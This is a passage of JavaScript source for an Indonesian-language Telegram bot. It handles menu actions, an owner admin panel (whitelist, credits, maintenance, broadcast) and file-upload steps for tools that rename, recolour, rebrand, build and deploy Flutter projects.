    try { await ctx.answerCbQuery(); } catch {}
    await showBuildMenu(ctx);
});

bot.action('build_zip', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_BUILD_ZIP' };
    await showBuildZipPrompt(ctx);
});

bot.action('build_url', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_BUILD_URL' };
    await showBuildUrlPrompt(ctx);
});

bot.action('build_status', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_STATUS_ID' };
    await showBuildStatusPrompt(ctx);
});

bot.action('build_get_apk', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_GETAPK_ID' };
    await showGetApkPrompt(ctx);
});

bot.action('menu_deploy', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    delete userState[ctx.from.id];
    await showDeployMenu(ctx);
});

bot.action('deploy_vercel', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_DEPLOY_ZIP', target: 'vercel' };
    await showDeployZipPrompt(ctx, 'vercel');
});

bot.action('deploy_netlify', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_DEPLOY_ZIP', target: 'netlify' };
    await showDeployZipPrompt(ctx, 'netlify');
});

bot.action('menu_jshtml', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_JSHTML_FILE' };
    const msgText = `<blockquote>🔄 <b>JS AND HTML TO DART</b>\n\nFitur ini mengkonversi file JavaScript atau HTML menjadi kode Dart Flutter.\n\n📌 <b>Format yang didukung:</b>\n• File <code>.js</code> langsung\n• File <code>.html</code> langsung\n• File <code>.zip</code> berisi file .js dan .html\n\n<b>Langkah 1:</b> Kirimkan file yang ingin dikonversi.\n\n⚠️ Konversi otomatis, hasil mungkin perlu penyesuaian manual.</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_ceksyntax', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_SYNTAX_FILE' };
    const msgText = `<blockquote>🔍 <b>CEK SYNTAX JS</b>\n\nFitur ini menganalisis file JavaScript dan mencari error syntax, warning, serta masalah umum.\n\n📌 <b>Yang dicek:</b>\n• Bracket/kurung yang tidak seimbang\n• Penggunaan var (saran: pakai let/const)\n• Perbandingan == (saran: pakai ===)\n• console.log yang tertinggal\n• Dan lainnya...\n\n<b>Langkah 1:</b> Kirimkan file <b>.js</b> atau <b>.zip</b> berisi file JS.\n</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_gantiicon', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_ICON_ZIP' };
    const msgText = `<blockquote>🖼 <b>GANTI ICON APP</b>\n\nFitur ini mengganti icon aplikasi Flutter kamu secara otomatis.\n\n📌 <b>Yang diganti:</b>\n• Icon Android (mipmap-mdpi hingga xxxhdpi)\n• Icon iOS (AppIcon.appiconset)\n• Icon Web Flutter\n\n<b>Langkah 1:</b> Kirimkan file <b>.zip</b> project Flutter kamu.\n\n⚠️ Setelah itu kamu akan diminta mengirim gambar icon baru (PNG, minimal 1024x1024).</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_renameapp', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const rem = getRemaining(ctx.from.id);
    userState[ctx.from.id] = { step: 'WAIT_RENAMEAPP_ZIP' };
    const msgText = `<blockquote>✏️ <b>RENAME NAMA APP</b>\n\nFitur ini mengganti nama aplikasi Flutter di seluruh file project.\n\n📌 <b>File yang diubah:</b>\n• pubspec.yaml\n• AndroidManifest.xml\n• strings.xml (Android)\n• Info.plist (iOS)\n• main.dart\n• Dan semua file .dart, .xml, .yaml lainnya\n\n💎 Kredit tersisa: <b>${rem}</b>\n\n<b>Langkah 1:</b> Kirimkan file <b>.zip</b> project Flutter kamu.</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_cekerrorfunc', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_ERRORFUNC_CODE' };
    const msgText = `<blockquote>🛠 <b>CEK ERROR FUNC</b>\n\nFitur ini menganalisis error pada kode JavaScript kamu secara langsung.\n\n📌 <b>Yang dicek:</b>\n• Bagian mana yang error (per baris)\n• Fungsi duplikat\n• Async tanpa try/catch\n• Empty catch block\n• Kurung/bracket tidak seimbang\n• Deteksi apakah kode buatan AI\n\n<b>Kirimkan langsung kode func kamu di sini.</b>\n\nContoh: paste fungsi JS kamu sekarang.</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('contact_dev', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const keyboard = { inline_keyboard: [
        [{ text: '💬 Chat Owner', url: `https://t.me/${config.OWNER_USERNAME}` }],
        [{ text: '🏠 Kembali ke Menu', callback_data: 'main_menu' }]
    ]};
    const message = `<blockquote>📞 <b>CONTACT DEVELOPER</b>\n\n👤 <b>Owner:</b> @${config.OWNER_USERNAME}\n\n📌 Hubungi owner untuk:\n• Pertanyaan seputar bot\n• Laporan bug / error\n• Pembelian kredit\n• Info lebih lanjut\n\n✅ Klik tombol di bawah untuk chat owner</blockquote>`;
    try {
        await ctx.editMessageText(message, { parse_mode: 'HTML', reply_markup: keyboard });
    } catch {
        await ctx.reply(message, { parse_mode: 'HTML', reply_markup: keyboard });
    }
});

// ============================================================
// PANEL OWNER — ACTIONS
// ============================================================
bot.action('panel_owner', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) {
        try { await ctx.answerCbQuery('⛔ Khusus Owner!'); } catch {}
        return;
    }
    await showOwnerPanel(ctx);
});

bot.action('owner_whitelist', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_ADD_USER' };
    await ctx.reply(`<blockquote>➕ <b>WHITELIST USER</b>\n\nKirimkan Telegram ID user yang ingin ditambahkan.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_remove', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_REMOVE_USER' };
    await ctx.reply(`<blockquote>➖ <b>REMOVE USER</b>\n\nKirimkan Telegram ID user yang ingin dihapus dari whitelist.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_list', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    const list = db.whitelist.map((id, i) => `${i + 1}. <code>${id}</code>`).join('\n');
    await ctx.reply(`<blockquote>📋 <b>DAFTAR WHITELIST</b>\n\nTotal: <b>${db.whitelist.length}</b> user\n\n${list || 'Kosong'}</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_add_credits', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_ADD_CREDITS_ID' };
    await ctx.reply(`<blockquote>💎 <b>TAMBAH KREDIT USER</b>\n\nKirimkan Telegram ID user yang ingin ditambah kreditnya.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_view_credits', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    const credits = readJson(CREDITS_FILE);
    const lines = Object.entries(credits).map(([id, c]) => `• <code>${id}</code>: <b>${c} kredit</b>`).join('\n');
    await ctx.reply(`<blockquote>👁️ <b>KREDIT SEMUA USER</b>\n\n${lines || 'Belum ada data'}</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_set_photo', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_SET_PHOTO' };
    await ctx.reply(`<blockquote>🖼️ Kirimkan foto untuk dijadikan media sambutan.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_set_video', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_SET_VIDEO' };
    await ctx.reply(`<blockquote>🎬 Kirimkan video untuk dijadikan media sambutan.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_set_audio', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_SET_AUDIO' };
    await ctx.reply(`<blockquote>🎵 Kirimkan audio untuk dijadikan media sambutan.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_clear_media', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    config.WELCOME_MEDIA = '';
    config.WELCOME_MEDIA_TYPE = '';
    updateConfig({ WELCOME_MEDIA: '', WELCOME_MEDIA_TYPE: '' });
    await ctx.reply(`<blockquote>✅ Media sambutan berhasil dihapus.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]] } });
});

bot.action('owner_toggle_maintenance', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}

    const maint = getMaintenance();
    if (maint.active) {
        maint.active = false;
        saveMaintenance(maint);
        await ctx.reply(
            `<blockquote>✅ <b>Maintenance DIMATIKAN!</b>\n\nBot sekarang aktif kembali dan bisa digunakan semua user.</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]] } }
        );
    } else {
        userState[ctx.from.id] = { step: 'OWNER_MAINTENANCE_REASON' };
        await ctx.reply(
            `<blockquote>🔧 <b>AKTIFKAN MAINTENANCE</b>\n\nKirimkan <b>alasan maintenance</b>.\nContoh: <code>lagi fix error fatal</code>\n\nAtau ketik <code>-</code> untuk skip alasan.</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } }
        );
    }
});

bot.action('owner_broadcast', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.answerCbQuery('⛔');
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'OWNER_BROADCAST_MSG' };
    await ctx.reply(
        `<blockquote>📢 <b>BROADCAST PESAN</b>\n\nKirimkan pesan yang ingin di-broadcast ke semua user.\n\n⚠️ Pesan akan dikirim ke <b>${db.whitelist.length}</b> user.\n\nKamu bisa kirim teks, foto, video, atau audio.\nUntuk teks: langsung ketik pesan.\nUntuk media: kirim dengan caption (opsional).</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } }
    );
});

// ============================================================
// HANDLER SEMUA PESAN — DENGAN TIMEOUT (PERBAIKAN)
// ============================================================
bot.on(['text', 'document', 'photo', 'video', 'audio'], async (ctx) => {
    const userId = ctx.from?.id;
    if (!userId) return;
    const state = userState[userId];
    if (!state) return;

    try {
        // ============================================================
        // OWNER HANDLERS
        // ============================================================
        if (state.step === 'OWNER_ADD_USER' && ctx.message.text) {
            await handleOwnerAddUser(ctx, state, db, saveDB, initCredits, getCredits);
            delete userState[userId];
            return;
        }

        if (state.step === 'OWNER_REMOVE_USER' && ctx.message.text) {
            await handleOwnerRemoveUser(ctx, state, db, saveDB);
            delete userState[userId];
            return;
        }

        if (state.step === 'OWNER_ADD_CREDITS_ID' && ctx.message.text) {
            const uid = parseInt(ctx.message.text.trim());
            if (isNaN(uid)) return ctx.reply(`<blockquote>⚠️ ID tidak valid.</blockquote>`, { parse_mode: 'HTML' });
            userState[userId] = { step: 'OWNER_ADD_CREDITS_AMOUNT', targetUid: uid };
            return ctx.reply(
                `<blockquote>💎 <b>TAMBAH KREDIT</b>\n\nUser: <code>${uid}</code>\nKredit saat ini: <b>${getCredits(uid) ?? 0}</b>\n\nKirimkan jumlah kredit yang ingin ditambahkan.\nContoh: <code>10</code></blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } }
            );
        }

        if (state.step === 'OWNER_ADD_CREDITS_AMOUNT' && ctx.message.text) {
            const amount = parseInt(ctx.message.text.trim());
            if (isNaN(amount) || amount <= 0) return ctx.reply(`<blockquote>⚠️ Jumlah tidak valid! Masukkan angka positif.</blockquote>`, { parse_mode: 'HTML' });
            addCredits(state.targetUid, amount);
            delete userState[userId];
            return ctx.reply(
                `<blockquote>✅ <b>Kredit berhasil ditambahkan!</b>\n\nUser: <code>${state.targetUid}</code>\nDitambahkan: <b>+${amount} kredit</b>\nTotal sekarang: <b>${getCredits(state.targetUid)} kredit</b></blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]] } }
            );
        }

        if (state.step === 'OWNER_SET_PHOTO' && ctx.message.photo) {
            await handleOwnerSetMedia(ctx, state, 'photo', updateConfig);
            delete userState[userId];
            return;
        }

        if (state.step === 'OWNER_SET_VIDEO' && ctx.message.video) {
            await handleOwnerSetMedia(ctx, state, 'video', updateConfig);
            delete userState[userId];
            return;
        }

        if (state.step === 'OWNER_SET_AUDIO' && (ctx.message.audio || ctx.message.document)) {
            await handleOwnerSetMedia(ctx, state, 'audio', updateConfig);
            delete userState[userId];
            return;
        }

        if (state.step === 'OWNER_MAINTENANCE_REASON' && ctx.message.text) {
            const reason = ctx.message.text.trim() === '-' ? 'Sedang dalam perbaikan' : ctx.message.text.trim();
            userState[userId] = { step: 'OWNER_MAINTENANCE_ETA', reason };
            return ctx.reply(
                `<blockquote>⏱ <b>ESTIMASI SELESAI</b>\n\nKirimkan estimasi waktu maintenance.\nContoh: <code>1-2 jam</code>\n\nAtau ketik <code>-</code> untuk skip.</blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'panel_owner' }]] } }
            );
        }

        if (state.step === 'OWNER_MAINTENANCE_ETA' && ctx.message.text) {
            const eta = ctx.message.text.trim() === '-' ? '1-2 jam' : ctx.message.text.trim();
            const maint = getMaintenance();
            maint.active = true;
            maint.reason = state.reason;
            maint.eta = eta;
            maint.started_at = new Date().toISOString();
            saveMaintenance(maint);
            delete userState[userId];
            return ctx.reply(
                `<blockquote>🔧 <b>Maintenance DIAKTIFKAN!</b>\n\n📝 Alasan: ${state.reason}\n⏱ Estimasi: ${eta}\n\n⚠️ Semua user (kecuali owner) tidak bisa menggunakan bot.\n\nUntuk mematikan maintenance, klik tombol di bawah.</blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                    [{ text: '🔓 Matikan Maintenance', callback_data: 'owner_toggle_maintenance' }],
                    [{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]
                ]}}
            );
        }

        // ============================================================
        // OWNER — BROADCAST
        // ============================================================
        if (state.step === 'OWNER_BROADCAST_MSG') {
            delete userState[userId];
            const allUsers = [...db.whitelist];
            const progMsg = await ctx.reply(
                `<blockquote>📢 <b>Broadcasting...</b>\n\n0 / ${allUsers.length} terkirim</blockquote>`,
                { parse_mode: 'HTML' }
            );

            let success = 0, failed = 0;
            for (const uid of allUsers) {
                if (uid === OWNER_ID) continue;
                try {
                    if (ctx.message.text) {
                        await bot.telegram.sendMessage(uid, ctx.message.text, { parse_mode: 'HTML' });
                    } else if (ctx.message.photo) {
                        const photo = ctx.message.photo[ctx.message.photo.length - 1].file_id;
                        await bot.telegram.sendPhoto(uid, photo, { caption: ctx.message.caption || '', parse_mode: 'HTML' });
                    } else if (ctx.message.video) {
                        await bot.telegram.sendVideo(uid, ctx.message.video.file_id, { caption: ctx.message.caption || '', parse_mode: 'HTML' });
                    } else if (ctx.message.audio) {
                        await bot.telegram.sendAudio(uid, ctx.message.audio.file_id, { caption: ctx.message.caption || '', parse_mode: 'HTML' });
                    } else if (ctx.message.document) {
                        await bot.telegram.sendDocument(uid, ctx.message.document.file_id, { caption: ctx.message.caption || '', parse_mode: 'HTML' });
                    }
                    success++;
                } catch {
                    failed++;
                }
                await new Promise(r => setTimeout(r, 50));
            }

            await ctx.telegram.editMessageText(
                progMsg.chat.id, progMsg.message_id, undefined,
                `<blockquote>📢 <b>Broadcast Selesai!</b>\n\n✅ Berhasil: <b>${success}</b>\n❌ Gagal: <b>${failed}</b>\n👥 Total: <b>${allUsers.length - 1}</b> user</blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '⚙️ Panel Owner', callback_data: 'panel_owner' }]] } }
            ).catch(() => {});
            return;
        }

        // ============================================================
        // RENAME ALL - DENGAN TIMEOUT
        // ============================================================
        if (['WAIT_RENAMEALL_ZIP','WAIT_RENAMEALL_NEW_DOMAIN','WAIT_RENAMEALL_OLD_DOMAIN',
             'WAIT_RENAMEALL_IMG','WAIT_RENAMEALL_VID',
             'WAIT_RENAMEALL_NEW_APPNAME','WAIT_RENAMEALL_OLD_APPNAME'].includes(state.step)) {
            if (state.step === 'WAIT_RENAMEALL_ZIP' && ctx.message.document) {
                const MAX_SIZE = 2 * 1024 * 1024 * 1024;
                const fileSize = ctx.message.document.file_size || 0;
                if (fileSize > MAX_SIZE) {
                    return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
                }
            }
            await processWithTimeout(ctx, () => handleRenameAllProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining));
            return;
        }

        // ============================================================
        // RENAME DOMAIN - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_RENAME_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleRenameProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, false));
            return;
        }

        if (state.step === 'WAIT_RENAME_DOMAIN' && ctx.message.text) {
            const newDomain = ctx.message.text.trim();
            userState[userId] = { ...state, step: 'WAIT_RENAME_OLD', newDomain };
            return ctx.reply(
                `<blockquote>✅ Domain baru: <code>${newDomain}</code>\n\nSekarang kirimkan <b>domain lama</b> yang ingin diganti.\nContoh: <code>api.old-domain.com</code> atau <code>api.old-domain.com:8080</code></blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
            );
        }

        if (state.step === 'WAIT_RENAME_OLD' && ctx.message.text) {
            await processWithTimeout(ctx, () => handleRenameProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true));
            return;
        }

        // ============================================================
        // RECOLOUR
        // ============================================================
        if (state.step === 'WAIT_RECOLOUR_DART') {
            if (ctx.message.text && ['selesai', 'done', 'ok', 'lanjut'].includes(ctx.message.text.trim().toLowerCase())) {
                if (!state.dartFiles || state.dartFiles.length === 0) {
                    return ctx.reply(
                        `<blockquote>⚠️ Belum ada file .dart yang dikirim!\n\nKirim minimal 1 file .dart terlebih dahulu.</blockquote>`,
                        { parse_mode: 'HTML' }
                    );
                }
                userState[userId] = { ...state, step: 'WAIT_RECOLOUR_COLOUR_PICK' };
                await showColourPicker(ctx, state.dartFiles);
                return;
            }

            if (ctx.message.document) {
                const doc = ctx.message.document;
                const fname = doc.file_name || '';
                if (!fname.endsWith('.dart')) {
                    return ctx.reply(
                        `<blockquote>❌ File harus berupa <b>.dart</b>!\n\nKirim file dart dari project Flutter kamu.\nJika sudah selesai kirim semua file, ketik <code>selesai</code>.</blockquote>`,
                        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
                    );
                }
                const waitMsg = await ctx.reply(`<blockquote>⏳ Mengunduh <code>${fname}</code>...</blockquote>`, { parse_mode: 'HTML' });
                let buffer;
                try {
                    buffer = await downloadTelegramFile(ctx, doc.file_id);
                } catch (e) {
                    await ctx.telegram.deleteMessage(waitMsg.chat.id, waitMsg.message_id).catch(() => {});
                    return ctx.reply(`<blockquote>❌ Gagal download: ${e.message}</blockquote>`, { parse_mode: 'HTML' });
                }
                await ctx.telegram.deleteMessage(waitMsg.chat.id, waitMsg.message_id).catch(() => {});

                const dartFiles = [...(state.dartFiles || []), { name: fname, buffer }];
                userState[userId] = { ...state, dartFiles };

                return ctx.reply(
                    `<blockquote>✅ <b>${fname}</b> ditambahkan!\n\n📄 Total file: <b>${dartFiles.length}</b>\n\nKirim file .dart berikutnya, atau ketik <code>selesai</code> untuk mulai proses recolour.</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                        [{ text: '✅ Selesai — Pilih Warna', callback_data: 'recolour_selesai' }],
                        [{ text: '❌ Batal', callback_data: 'main_menu' }]
                    ]} }
                );
            }
            return;
        }

        if (state.step === 'WAIT_CUSTOM_HEX' && ctx.message.text) {
            const hex = ctx.message.text.trim().replace('#', '').toUpperCase();
            if (!/^[0-9A-F]{6,8}$/.test(hex)) {
                return ctx.reply(`<blockquote>❌ Format HEX tidak valid!\nContoh: <code>FF5733</code></blockquote>`, { parse_mode: 'HTML' });
            }
            userState[userId] = { ...state, step: 'WAIT_RECOLOUR_OLD_HEX', targetHex: hex };
            return ctx.reply(
                `<blockquote>✅ Warna baru: <b>#${hex}</b>\n\nSekarang kirimkan <b>warna lama</b> (HEX) yang ingin diganti.\nContoh: <code>2196F3</code></blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
            );
        }

        if (state.step === 'WAIT_RECOLOUR_OLD_HEX' && ctx.message.text) {
            await processWithTimeout(ctx, () => handleRecolourProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, AdmZip, true));
            return;
        }

        // ============================================================
        // MANAGE FUNCTIONS - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_FUNC_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleFunctionsProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, false));
            return;
        }

        if (state.step === 'WAIT_FUNC_OLD' && ctx.message.text) {
            const oldFunc = ctx.message.text.trim();
            userState[userId] = { ...state, step: 'WAIT_FUNC_NEW', oldFunc };
            return ctx.reply(
                `<blockquote>✅ Fungsi lama: <code>${oldFunc}</code>\n\nSekarang kirimkan <b>nama fungsi atau kode BARU</b> penggantinya.</blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
            );
        }

        if (state.step === 'WAIT_FUNC_NEW' && ctx.message.text) {
            await processWithTimeout(ctx, () => handleFunctionsProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true));
            return;
        }

        // ============================================================
        // COMPRESS BASE - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_COMPRESS_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleCompressProcess(ctx, state, userState, downloadTelegramFile));
            return;
        }

        // ============================================================
        // JS AND HTML TO DART - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_JSHTML_FILE' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleJsHtmlToDartProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, false));
            return;
        }

        // ============================================================
        // CEK SYNTAX JS
        // ============================================================
        if (state.step === 'WAIT_SYNTAX_FILE' && ctx.message.document) {
            await handleCekSyntaxProcess(ctx, state, userState, downloadTelegramFile);
            delete userState[userId];
            return;
        }

        // ============================================================
        // GANTI ICON APP - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_ICON_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleGantiIconProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, false));
            return;
        }
        if (state.step === 'WAIT_ICON_IMAGE' && (ctx.message.photo || ctx.message.document)) {
            await processWithTimeout(ctx, () => handleGantiIconProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true));
            return;
        }

        // ============================================================
        // RENAME NAMA APP - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_RENAMEAPP_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleRenameAppProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, false));
            return;
        }
